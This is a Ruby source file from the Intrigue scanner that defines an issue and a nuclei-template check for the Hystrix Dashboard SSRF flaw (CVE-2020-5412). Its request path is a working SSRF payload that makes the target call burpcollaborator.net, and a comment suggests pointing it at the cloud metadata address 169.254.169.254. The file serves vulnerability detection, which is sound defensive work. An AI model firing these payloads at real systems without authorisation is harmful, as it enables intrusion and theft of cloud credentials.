
module Intrigue

  module Issue
    class NetflixHystrixCve20205412 < BaseIssue
      def self.generate(instance_details={})
      {
        added: "2021-03-30",
        name: "netflix_hystrix_cve_2020_5412",
        pretty_name: "Netflix Hystrix Dashboard Server Side Request Forgery (CVE-2020-5412)",
        severity: 1,
        category: "vulnerability",
        status: "confirmed",
        description: "Spring Cloud Netflix, versions 2.2.x prior to 2.2.4, versions 2.1.x prior to 2.1.6, and older unsupported versions allow applications to use the Hystrix Dashboard proxy.stream endpoint to make requests to any server reachable by the server hosting the dashboard. A malicious user, or attacker, can send a request to other servers that should not be exposed publicly.",
        identifiers: [
          { type: "CVE", name: "CVE-2020-5412" }
        ],
        affected_software: [ 
          { :vendor => "Netflix", :product => "Hystrix Dashboard" }
        ],
        references: [
          { type: "description", uri: "https://nvd.nist.gov/vuln/detail/CVE-2020-5412" },
          { type: "description", uri: "https://tanzu.vmware.com/security/cve-2020-5412" }
        ],
        authors: ["Vern", "dwisiswant0", "maxim"]
      }.merge!(instance_details)
      end
    end
  end

  module Task
    class NetflixHystrixCve20205412 < BaseCheck
      def self.check_metadata
        {
          allowed_types: ['Uri']
        }
      end

      # return truthy value to create an issue
      def check

        # run a nuclei
        uri = _get_entity_name
        template = <<-HEREDOC
        id: CVE-2020-5412

        info:
          name: Full-read SSRF in Spring Cloud Netflix (Hystrix Dashboard)
          author: dwisiswant0
          severity: medium
          description: Spring Cloud Netflix, versions 2.2.x prior to 2.2.4, versions 2.1.x prior to 2.1.6, and older unsupported versions allow applications to use the Hystrix Dashboard proxy.stream endpoint to make requests to any server reachable by the server hosting the dashboard. A malicious user, or attacker, can send a request to other servers that should not be exposed publicly.
          tags: cve,cve2020,ssrf,springcloud
          reference: https://tanzu.vmware.com/security/cve-2020-5412
        
        requests:
          - method: GET
            path:
              - "{{BaseURL}}/proxy.stream?origin=http://burpcollaborator.net/"
        
              # To get crithit, try http://169.254.169.254/latest/metadata/
        
            matchers-condition: and
            matchers:
              - type: word
                words:
                  - "Burp Collaborator Server"
                part: body
              - type: status
                status:
                  - 200
        HEREDOC

        # if this returns truthy value, an issue will be raised
        # the truthy value will be added as proof to the issue
        run_nuclei_template_from_string uri, template
      end

    end
  end
end
